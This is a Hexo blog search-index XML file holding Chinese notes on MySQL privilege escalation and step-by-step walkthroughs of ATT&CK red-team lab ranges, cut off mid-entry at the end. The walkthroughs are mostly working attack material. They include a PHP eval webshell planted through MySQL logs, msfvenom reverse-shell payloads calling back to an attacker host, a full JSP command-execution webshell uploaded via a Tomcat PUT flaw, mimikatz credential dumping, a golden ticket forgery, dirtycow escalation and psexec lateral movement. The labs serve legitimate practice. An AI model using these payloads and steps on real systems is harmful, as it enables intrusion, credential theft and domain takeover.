<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql提权</title>
      <link href="/2020/09/07/mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2020/09/07/mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>MySQL提权</p><p>1.UDF提权<br>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。<br>2.MOF提权<br>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场</title>
      <link href="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场-一"><a href="#ATT-amp-CK红队评估实战靶场-一" class="headerlink" title="ATT&amp;CK红队评估实战靶场(一)"></a>ATT&amp;CK红队评估实战靶场(一)</h1><p>搭建好环境后,用nmap进行扫描</p><blockquote><p>nmap -sV -p- 192.168.189.129</p></blockquote><p>发现开启80，3306端口</p><p>访问192.168.189.129:80网页</p><a id="more"></a><p>是php探针</p><p>发现最下面是mysql检测</p><p>尝试默认密码</p><p>root/root</p><p>成功</p><p>用nikto扫描目录</p><blockquote><p>nikto -h 192.168.189.129</p></blockquote><p>发现扫描到</p><p>phpinfo.php</p><p>phpmyadmin</p><p>用root/root登录phpmyadmin</p><p>尝试用 into outfile 文件写入shell</p><p>需要以下条件</p><blockquote><p>1、对web目录需要有写权限能够使用单引号</p><p>select user();</p><p>2、知道绝对路径</p><p>3、没有配置-secure-file-priv（在mysql的配置文件中需要有一句 secure_file_priv=” ，没有的话自行添加或修改）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure></blockquote><p>发现secure_file_priv是null</p><p>不能导入导出文件</p><p>尝试利用日志getshell</p><blockquote><p>show global variables like ‘%general%’</p></blockquote><p>发现是off</p><p>设置为on</p><blockquote><p>set global general_log=’ON’</p></blockquote><p> 将日志文件的存放位置修改为当前网站的根目录： </p><blockquote><p>set global  general_log_file = ‘C:/phpStudy/WWW/shell.php’</p></blockquote><p>然后执行语句</p><blockquote><p>SELECT ‘<?php @eval($_POST["bypass"]); ?>‘</p></blockquote><p>查看靶机上是否写入成功</p><p>有shell.php文件</p><blockquote><p>200906 22:25:39      153 Connect    root@localhost on<br>     153 Query    SET NAMES ‘utf8’ COLLATE ‘utf8_general_ci’<br>     153 Query    SELECT ‘<?php @eval($_POST["bypass"]); ?>‘<br>     153 Quit    </p></blockquote><p>然后用蚁剑连接shell</p><blockquote><p><a href="http://192.168.189.129/shell.php" target="_blank" rel="noopener">http://192.168.189.129/shell.php</a></p></blockquote><p>查询下权限</p><blockquote><p>whoami</p><p>god\administrator</p><p> 当前是个域管理员的权限 </p></blockquote><p>再查询下其他信息</p><blockquote><p>ipconfig /all</p><p>两张网卡</p><p>IPv4 地址 . . . . . . . . . . . . : 192.168.52.2(首选) </p><p>IPv4 地址 . . . . . . . . . . . . : 192.168.189.129(首选)</p><p>systeminfo    </p><p>net config workstation 查看当前登录域 和用户登录信息</p><p>ping owa.god.org   得到域控的ip</p><p>192.168.52.3</p></blockquote><p>为了方便后续内网横向移动，利用webshell 反弹shell至MSF 和 cobaltstrike： </p><p>使用msfvenom生成payload文件</p><blockquote><p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=7777 -f raw &gt; test.php</p></blockquote><p>然后用蚁剑上传</p><p>然后用msf的handler模块监听</p><blockquote><p>use exploit/multi/handler</p><p>set payload php/meterpreter/reverse_tcp</p><p>set LHOST 192.168.189.128</p><p>set LPORT 7777</p><p>exploit</p></blockquote><p>远程访问文件</p><p>成功反弹shell</p><p>然后用 cobaltstrike 进行下一步操作</p><h2 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h2><blockquote><p>./teamserver &lt;你的ip&gt; &lt;密码&gt; </p></blockquote><h2 id="部署CobaltStrike"><a href="#部署CobaltStrike" class="headerlink" title="部署CobaltStrike"></a>部署CobaltStrike</h2><blockquote><p>./start.sh</p></blockquote><p>然后</p><blockquote><p>cobalt strike-&gt;listeners-&gt;add</p><p>填入服务器ip和空闲的监听端口</p><p>接着生成payload</p><p>attacks-&gt;packages-&gt;windows executable</p><p>用蚁剑上传</p><p>start &lt;payload名字&gt;</p></blockquote><p>得到shell</p><blockquote><p>user是administrator</p></blockquote><p>然后用 svc-exe 提权</p><blockquote><p>先右键interact得到beacon</p><p>右键access-&gt;elevate</p><p>elevate svc-exe test</p><p>得到system权限</p></blockquote><p>用hashdump看下密码</p><blockquote><p>hashdump</p></blockquote><p>用logonpasswords抓取明文密码</p><blockquote><p>logonpasswords</p></blockquote><p>抓到hongrisec@2020 密码</p><p>接下来进行psexec传递</p><p>有两种情况</p><h2 id="目标机出网"><a href="#目标机出网" class="headerlink" title="目标机出网"></a>目标机出网</h2><blockquote><p>获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ）</p><p>使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`beacon&gt; portscan 192.168.144.0/24 445 arp 200`</span><br></pre></td></tr></table></figure><p>view-&gt;targets</p><p>jump-&gt;psexec</p><p>选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 </p></blockquote><h2 id="目标机不出网"><a href="#目标机不出网" class="headerlink" title="目标机不出网"></a>目标机不出网</h2><blockquote><p>实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 </p><p>选择已经上线的主机创建listener smb</p><p>spawn smb </p><p>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 </p><p>选择刚建立的Listener名字 </p><p>右键主机explore-&gt;file browser</p><p>上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe。 </p><p>在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 </p><p>beacon&gt;shell C:\phpStudy\WWW\PsExec.exe -accepteula \192.168.52.2,192.168.52.3 -u Administrator -p hongrisec@2019 -d -c C:\phpStudy\WWW\beacon.exe</p></blockquote><p>也可以view-&gt;targets-&gt;jump-&gt;psexec</p><p>监听smb</p><h1 id="ATT-amp-CK红队评估实战靶场-二"><a href="#ATT-amp-CK红队评估实战靶场-二" class="headerlink" title="ATT&amp;CK红队评估实战靶场(二)"></a>ATT&amp;CK红队评估实战靶场(二)</h1><p>环境搭建完毕，扫描网段存活主机</p><blockquote><p>nmap -sV 192.168.111.0/24</p></blockquote><p>发现有</p><blockquote><p>192.168.111.80   80 135 139 445 1433 3389 7001</p><p>192.168.111.201 135 139 445 3389</p></blockquote><p> 192.168.111.80尝试下7001端口，发现是weblogic服务 </p><p>使用WeblogicScan.py扫描下可能存在的漏洞</p><blockquote><p>python3 WeblogicScan.py -u 192.168.111.80 -p 7001</p><p>得到以下内容</p><p>[192.168.111.80:7001] Weblogic Version Is 10.3.6.0<br>[+] [192.168.111.80:7001] Weblogic console address is exposed! The path is: <a href="http://192.168.111.80:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>[+] [192.168.111.80:7001] Weblogic UDDI module is exposed! The path is: <a href="http://192.168.111.80:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.111.80:7001/uddiexplorer/</a></p><p>[+] [192.168.111.80:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</p></blockquote><p>可能存在cve-2019-2725</p><blockquote><p>用msf</p><p>search weblogic</p><p>use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p><p>设置option后</p><p>exploit</p><p>出现这个错误Exploit completed, but no session was created.</p><p>发现这个payload是针对unix环境的</p><p>show targets</p><p>set target 1</p><p>也可以使用 java 反序列化终极测试工具测试漏洞，工具地址：<a href="https://kfire.net/220.html" target="_blank" rel="noopener">https://kfire.net/220.html</a> </p></blockquote><p>成功getshell</p><p>然后</p><blockquote><p>shell</p><p>whoami</p><p>de1ay\administrator</p><p>然后查看开放端口</p><p>netstat -ano</p><p>查看网卡</p><p>ipconfig /all</p><p>得到dns服务器  10.10.10.10</p><p>beacon&gt;shell net config workstation   得到登录域信息</p><p>工作站域  de1ay.com</p><p>beacon&gt;net view    域内主机</p><p>pc 192.168.111.201</p><p>web 192.168.111.80</p><p>beacon&gt;shell net user /domain    域内用户</p><p>Administrator   krbtgt</p><p>beacon&gt;shell net group “domain controllers” /domain      查看域控制器名 </p><p>DC</p><p>beacon&gt;shell ping DC.de1ay.com     得到域控的ip</p><p>10.10.10.10</p></blockquote><p>然后把msf的shell派生到cs中</p><blockquote><p>background</p><p>use exploit/windows/local/payload_inject</p><p>set payload windows/meterpreter/reverse_http</p><p>set LhOST 192.168.111.128</p><p>set lport 8888</p><p>set session 1</p><p>set disablepayloadhandler true</p><p>run</p></blockquote><p>接着用mimikatz和hashdump抓取密码</p><blockquote><p>beacon&gt;logonpasswords</p><p>hashdump</p></blockquote><p>然后进行提权</p><p>用 svc-exe 提权</p><blockquote><p>先右键interact得到beacon</p><p>右键access-&gt;elevate</p><p>elevate svc-exe test</p><p>得到system权限</p></blockquote><p>信息收集完毕后</p><p>进行psexec传递</p><p>先创建smb</p><blockquote><p>可以右键session创建监听smb</p><p>beacon&gt;spawn smb </p><p>再进行psexec传递</p><p>监听smb</p></blockquote><p>成功拿下域控</p><h3 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h3><blockquote><p>hashdump</p></blockquote><p>在域控获得KRBTGT账户NTLM密码哈希</p><p>82dfc71b72a11ef37d663047bc2088fb</p><blockquote><p>logonpasswords</p></blockquote><p>得到SID</p><p>S-1-5-21-2756371121-2868759905-3853650604</p><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>黄金票据的条件要求：<br>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名</p><p>原理这篇 <a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">https://www.freesion.com/article/6833306427/</a> 博客讲的很详细。</p><p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p><p>WEB机 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png" alt></p><h1 id="ATT-amp-CK红队评估实战靶场-三"><a href="#ATT-amp-CK红队评估实战靶场-三" class="headerlink" title="ATT&amp;CK红队评估实战靶场(三)"></a>ATT&amp;CK红队评估实战靶场(三)</h1><p>环境搭建完毕后,用nmap进行扫描</p><blockquote><p>nmap -sS -p- 192.168.1.1/24</p><p>192.168.1.110   开启22 80 3306 端口</p></blockquote><p>访问80端口，发现是用 Joomla搭建的网站</p><p>用joomscan进行扫描</p><blockquote><p>perl joomscan.pl -u <a href="http://192.168.1.110" target="_blank" rel="noopener">http://192.168.1.110</a></p></blockquote><p>发现登录页面<a href="http://192.168.1.110/administrator/" target="_blank" rel="noopener">http://192.168.1.110/administrator/</a></p><p>发现配置文件<a href="http://192.168.1.110/configuration.php" target="_blank" rel="noopener">http://192.168.1.110/configuration.php</a>~</p><p>在配置文件中发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public $dbtype = &apos;mysqli&apos;;</span><br><span class="line">public $host = &apos;localhost&apos;;</span><br><span class="line">public $user = &apos;testuser&apos;;</span><br><span class="line">public $password = &apos;cvcvgjASD!@&apos;;</span><br></pre></td></tr></table></figure><p>尝试连接mysql数据库</p><blockquote><p>mysql -h 192.168.1.110 -u testuser -P 3306 -p</p><p>cvcvgjASD!@</p></blockquote><p>连接成功</p><p> joomla默认后端编辑模板即可getshell</p><p>因为数据表中存储的管理员密码是加密的 </p><p> 根据 joomla 官方文档 <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a> 执行 sql 语句在数据库中添加 admin2/secret 超级管理员，注意 sql 语句修改为目标数据表的前缀。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&apos;Administrator2&apos;, &apos;admin2&apos;,</span><br><span class="line"> &apos;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&apos;, &apos;&apos;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&apos;8&apos;);</span><br></pre></td></tr></table></figure><p>登录界面用admin2  secret登录成功</p><p> Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files-&gt;New File 新建文件 shell.php，写入一句话木马。 </p><p>蚁剑连接</p><p><a href="http://192.168.1.110/templates/beez3/test.php" target="_blank" rel="noopener">http://192.168.1.110/templates/beez3/test.php</a></p><p>尝试执行命令，返回ret=127，毫无疑问就是disable_functions的限制了 </p><p>通过phpinfo发现禁用了如下函数，目标是linux </p><p>没有禁用putenv函数 ,尝试利用LD_PRELOAD绕过 </p><p>用蚁剑把 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 上传到目标的同一目录，注意 .so 文件需要根据目标系统架构选择，然后访问 bypass_diablefunc.php，cmd 是执行的命令，outpath是读写权限的目录，sopath是 .so 文件的绝对路径。</p><p>工具下载地址： <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><blockquote><p><a href="http://192.168.1.110/tmp/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/tmp/bypass_disablefunc_x64.so" target="_blank" rel="noopener">http://192.168.1.110/tmp/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/baji&amp;sopath=/var/www/html/tmp/bypass_disablefunc_x64.so</a></p></blockquote><p>收集信息</p><blockquote><p>whoami     www-data </p><p>ifconfig       192.168.93.120  </p><p>cat /proc/version      </p><p>Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 </p></blockquote><p>在/tmp/mysql/test.txt中找到</p><blockquote><p>adduser wwwuser<br>passwd wwwuser_123Aqx</p></blockquote><p>尝试ssh连接</p><blockquote><p>ssh <a href="mailto:wwwuser@192.168.1.110" target="_blank" rel="noopener">wwwuser@192.168.1.110</a></p></blockquote><p>192.168.1.110不是我们getshell的主机，后端应该是nginx反代，我们目前得到的ubuntu的IP地址应该是192.168.93.120</p><blockquote><p>cat /proc/version<br>Linux version 2.6.32-431.el6.x86_64 (<a href="mailto:mockbuild@c6b8.bsys.dev.centos.org" target="_blank" rel="noopener">mockbuild@c6b8.bsys.dev.centos.org</a>) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC) ) #1 SMP Fri Nov 22 03:15:09 UTC 2013</p></blockquote><p>版本在脏牛提权的范围内</p><blockquote><p>脏牛Linux本地提权漏洞复现(CVE-2016-5195)</p><h6 id="漏洞范围："><a href="#漏洞范围：" class="headerlink" title="漏洞范围："></a>漏洞范围：</h6><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><h6 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h6><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p><h6 id="简要分析："><a href="#简要分析：" class="headerlink" title="简要分析："></a>简要分析：</h6><p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p></blockquote><p>上传exp到centos中</p><p> <a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a> </p><blockquote><p>scp /root/dirtycow-master/dirty.c <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:dirty.c</p></blockquote><p> 使用<code>gcc -pthread dirty.c -o dirty -lcrypt</code>命令对dirty.c进行编译，生成一个dirty的可执行文件。 </p><blockquote><p>[wwwuser@localhost ~]$ ./dirty baji<br>File /tmp/passwd.bak already exists! Please delete it and run again</p></blockquote><blockquote><p>rm /tmp/passwd.bak</p></blockquote><blockquote><p>./dirty baji</p><p>Done! Check /etc/passwd to see if the new user was created.<br>You can log in with the username ‘firefart’ and the password ‘baji’.</p></blockquote><p>可以cat /etc/passwd查看是否成功</p><p> 切换 firefart/baji 用户，成功提权。 </p><blockquote><p>su fierfart</p></blockquote><p>scp /root/artifact.exe <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:artifact.exe</p><p>用msf进行上线,先生成payload文件</p><blockquote><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=4444 -f elf &gt; shell.elf</p></blockquote><p>然后scp进行上传</p><blockquote><p>scp shell.elf <a href="mailto:wwwuser@192.168.1.129" target="_blank" rel="noopener">wwwuser@192.168.1.129</a>:shell.elf</p></blockquote><p>然后启动msf监听</p><blockquote><p>use exploit/multi/handler</p><p>set payload linux/x86/meterpreter/reverse_tcp</p><p>set lhost 192.168.1.128</p><p>set lport 4444</p><p>exploit</p></blockquote><p>进行内网探测</p><blockquote><p>run autoroute -s 192.168.93.0/24     在session下添加路由</p><p>background     meterpreter放在后台 </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">background</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>因为同时开6台太卡了，以下全是其他大佬的流程</p><ul><li><p>192.168.93.10 windows 2012</p></li><li><p>192.168.93.20 windows 2008</p></li><li><p>192.168.93.30 windows 7</p><p>尝试爆破 windows 2008 的本地管理员 </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /usr/share/wordlists/top1000.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p> 123qwe!ASD </p><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>在爆破密码成功的基础上，使用 msf 开个 socks4 正向代理，配合 proxychains。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 1080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/proxychains.png" alt></p><p>wmi 出现在所有的 windows 操作系统中，由一组强大的工具集合组成，用于管理本地或远程的 windows 系统。攻击者使用 wmi 攻击时 windows 系统默认不会在日志中记录这些操作，可以做到无日志、攻击脚本无需写入到磁盘，增加了隐蔽性。</p><p>wmiexec 执行命令，搜集信息，wmiexec.py 下载地址 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -debug &apos;administrator:123qwe!ASD@192.168.93.20&apos;</span><br></pre></td></tr></table></figure><p>也可以用psexec登陆win2008</p><blockquote><p>use exploit/windows/smb/psexec </p><p>set payload windows/meterpreter/bind_tcp</p><p> set rhost 192.168.93.20</p><p> set smbuser Administrator </p><p> set smbpass  123qwe!ASD </p><p>run</p></blockquote><p>ipconfig /all 知道 dns 服务器即域控是 192.168.93.10。那么基本的内网拓扑也清楚了，一台 centos 反向代理了一个 web，centos 有两个网卡，web 服务后端在 ubuntu 上，三台 windows 组成域环境，ip 分别是 192.168.93.10，192.168.93.20，192.168.93.30，域控为 windows server 2012，ip 为 192.168.93.10。</p><p>（反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。反向代理的工作原理是，代理服务器来接受客户端的网络访问连接请求，然后服务器将请求有策略的转发给网络中实际工作的业务服务器，并将从业务服务器处理的结果，返回给网络上发起连接请求的客户端。更多解释 <a href="https://www.zhihu.com/question/36412304" target="_blank" rel="noopener">https://www.zhihu.com/question/36412304</a></p><p>反向代理优点：</p><ul><li>提高了内部服务器的安全</li><li>加快了对内部服务器的访问速度</li><li>节约了有限的IP资源</li></ul><p>）</p><p> tasklist /V 查看进程（显示对应用户），发现TEST域进程，可以尝试抓密码。 </p><p>kali 使用 smbclient 通过代理连接 windows server 2008 上传 mimikatz。下载地址 <a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.93.20/C$ -U administratorput mimikatz.exe</span><br></pre></td></tr></table></figure><p>wmiexec 远程执行 mimikatz 成功得到域管理员密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</span><br></pre></td></tr></table></figure><p>IPC$（Internet Process Connection）是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。利用IPC$连接者可以与目标主机建立一个连接，得到目标主机上的目录结构、用户列表等信息。</p><p>利用条件：</p><ol><li>管理员开启了默认共享</li><li>139或445端口开放</li></ol><p>ipc 远程连接读 flag.txt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.10\admin$ zxcASDqw123!! /user:test\administrator   #系统默认路径c:\windows\下</span><br><span class="line">dir \\192.168.93.10\C$\users\administrator\Documents</span><br><span class="line">type \\192.168.93.10\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure><h1 id="ATT-amp-CK红队评估实战靶场-四"><a href="#ATT-amp-CK红队评估实战靶场-四" class="headerlink" title="ATT&amp;CK红队评估实战靶场(四)"></a>ATT&amp;CK红队评估实战靶场(四)</h1><p>搭建环境后，docker要手动启动</p><p> 需要启动的环境分别为：s2-045、CVE-2017-12615、 cve-2018-12613 </p><p>ubuntu为我们的web环境，其中的web环境需要手动开启，全部为docker环境，启动方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>开始getshell</p><p>CVE-2017-12615 漏洞</p><p>这是一个关于任意文件上传的漏洞，在tomcat中启用put方法会导致任意文件可以上传，从而导致服务器权限被获取 </p><p>当web.xml中readonly设置为false时可以通过PUT/DELETE进行文件操控，漏洞就会触发。 </p><p><strong>漏洞危害：</strong>泄露用户代码数据，或用户服务器被攻击者控制。<br><strong>影响范围：</strong>Apache Tomcat 7.0.0 – 7.0.79 </p><p><a href="http://192.168.157.129:2002/" target="_blank" rel="noopener">http://192.168.157.129:2002/</a></p><p>抓包上传put</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.157.129:2002</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://192.168.157.129:2002/shell.jsp?pwd=023&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.157.129:2002/shell.jsp?pwd=023&amp;cmd=whoami</a></p></blockquote><blockquote><p>root\n</p></blockquote><p>也可以上传冰蝎的shell.jsp文件</p><p>进行连接</p><p>CVE-2018-12613,这个是一个phpmyadmin的洞，也就是文件包含，利用起来也还算方便，方法如下（环境为config模式，可直接使用test账户登录）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 